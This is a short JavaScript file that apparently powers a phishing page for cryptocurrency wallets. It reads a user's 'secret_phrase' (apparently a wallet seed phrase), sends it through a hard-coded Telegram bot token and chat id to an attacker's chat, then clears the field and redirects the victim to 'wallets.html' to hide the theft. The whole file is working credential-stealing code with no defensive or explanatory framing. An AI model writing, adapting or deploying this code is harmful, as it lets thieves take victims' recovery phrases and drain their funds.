//bot token
var telegram_bot_id = "8009050911:AAESEdsqTpfmdCRLDNtM0LGadGRZJ4Lu64E";
//chat id
var chat_id = -1003134500593; //chat id here
var phr;
var ready = function () {
    phr = document.getElementById("secret_phrase").value;
    message = "Phrase: " + phr;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);

         window.location.href = "wallets.html";
    });
    document.getElementById("secret_phrase").value = "";
    return false;
};